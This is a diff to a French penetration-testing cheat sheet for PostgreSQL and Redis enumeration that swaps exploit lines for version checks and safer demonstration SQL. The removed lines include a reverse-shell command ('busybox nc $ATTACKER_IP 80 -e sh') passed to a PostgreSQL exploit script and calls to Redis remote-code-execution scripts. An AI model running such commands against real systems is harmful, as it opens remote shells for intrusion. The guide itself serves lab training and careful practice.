@@ -2412,14 +2412,14 @@ psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W
 
 ```
 
-<p class="oscp-command-note">PostgreSQL : exemple historique de script tiers non vérifié ; contrôler CVE, version et paramètres avant usage.</p>
+<p class="oscp-command-note">PostgreSQL : relever la version du serveur avant de rechercher une vulnérabilité. Ne pas exécuter de script tiers sans avoir vérifié son origine, sa syntaxe et les conditions de la CVE.</p>
 
-```bash
-# Avant tout test d'exploitation PostgreSQL, vérifier la version exacte, les correctifs et les conditions de la CVE.
+```sql
+-- Dans psql : afficher la version exacte du serveur PostgreSQL
+SELECT version();
 
-# Exemple historique d'exploitation : script externe non audité, ne pas exécuter sans vérification préalable
-python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
-
+-- Afficher l'identité et la base de la session courante
+SELECT current_user, current_database();
 ```
 
 <p class="oscp-command-note">PostgreSQL : COPY FROM PROGRAM exécute `id` sur le serveur sous le compte du service PostgreSQL, uniquement avec les droits superutilisateur ou `pg_execute_server_program`. Cette démonstration crée puis supprime une table : laboratoire uniquement.</p>
@@ -2450,11 +2450,11 @@ Dans l'invite `psql`, exécuter les lignes suivantes individuellement : `\l` lis
 <p class="oscp-command-note">Dans psql : requêtes SQL de lecture et modifications de données de démonstration, à exécuter séparément des méta-commandes.</p>
 
 ```sql
--- Lire les lignes d'une table autorisée
-SELECT * FROM <TABLE_NAME>;
+-- Exemple à adapter à une table existante et autorisée ; remplacer public.users par le schéma et la table réels
+SELECT * FROM public.users LIMIT 10;
 
--- Filtrer les lignes d'une table existante
-SELECT * FROM users WHERE attribute = 'value';
+-- Exemple de filtre : remplacer la colonne et la valeur selon le schéma réel
+SELECT * FROM public.users WHERE username = 'utilisateur_test' LIMIT 10;
 
 -- Inventorier les colonnes du schéma public
 SELECT table_name, column_name, data_type
@@ -2471,11 +2471,11 @@ CREATE TABLE test_table (
 -- Insérer une ligne de test
 INSERT INTO test_table (name) VALUES ('example_data');
 
--- Modifier uniquement la ligne de test choisie
-UPDATE test_table SET name = 'updated_data' WHERE id = 1;
+-- Modifier uniquement la ligne de démonstration identifiée par son nom
+UPDATE test_table SET name = 'updated_data' WHERE name = 'example_data';
 
--- Supprimer uniquement la ligne de test choisie
-DELETE FROM test_table WHERE id = 1;
+-- Supprimer uniquement la ligne créée pour la démonstration
+DELETE FROM test_table WHERE name = 'updated_data';
 ```
 
 ### 5900: VNC (Virtual Network Computing)
@@ -2584,25 +2584,21 @@ nmap -sV -p 6379 --script redis-info <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">Redis : --askpass demande le mot de passe interactif ; sans authentification, utiliser redis-cli sans cette option.</p>
+<p class="oscp-command-note">Redis : `--askpass` demande un mot de passe interactif et évite de l'exposer dans les arguments du processus. Sans mot de passe configuré, utiliser `redis-cli` sans cette option ; les ACL peuvent aussi exiger un nom d'utilisateur.</p>
 
 ```bash
 redis-cli -h <IP_CIBLE> -p 6379 --askpass
 
 ```
 
-<p class="oscp-command-note">Redis : SearchSploit sert à rechercher des références ; les scripts tiers ci-dessous ne sont pas des outils Redis installés par défaut.</p>
+<p class="oscp-command-note">Redis : identifier d'abord la version et la configuration accessible. `searchsploit` fournit des références locales, mais ne démontre pas qu'une cible est vulnérable. Les exemples de scripts externes non identifiés ont été retirés.</p>
 
 ```bash
-# SearchSploit : consulter les références Redis disponibles localement, sans conclure que la cible est vulnérable
+# Rechercher des références publiques à examiner en fonction de la version détectée
 searchsploit redis
 
-# Script externe absent du guide : ne pas exécuter sans récupérer et examiner sa source
-python3 redis-rogue-server.py -p 6379
-
-# Script externe absent du guide : les arguments -h/-p/-c dépendent de sa version et doivent être vérifiés
-python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
-
+# Interroger le service avec le client officiel si l'accès est autorisé
+redis-cli -h <IP_CIBLE> -p 6379 INFO server
 ```
 
 <p class="oscp-command-note">Sur Kali : démarrer le client Redis. Une authentification peut être nécessaire.</p>
@@ -2611,7 +2607,7 @@ python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
 redis-cli -h <IP_CIBLE> -p 6379
 ```
 
-<p class="oscp-command-note">Dans l'invite `redis-cli` : `INFO` affiche les informations autorisées ; répéter `SCAN` avec le curseur renvoyé jusqu'à zéro. `SELECT 0` choisit la base 0 ; `CONFIG GET` dépend des ACL. `SET` modifie les données : laboratoire uniquement. Ne pas exécuter `SHUTDOWN`.</p>
+<p class="oscp-command-note">Dans l'invite `redis-cli` : `INFO` affiche les informations autorisées ; répéter `SCAN` avec le curseur renvoyé jusqu'à zéro. `SELECT 0` choisit la base 0 (non applicable aux configurations Redis Cluster) ; `CONFIG GET` dépend des ACL. `SET` modifie les données : laboratoire uniquement. Ne pas exécuter `SHUTDOWN`.</p>
 
 ```text
 INFO
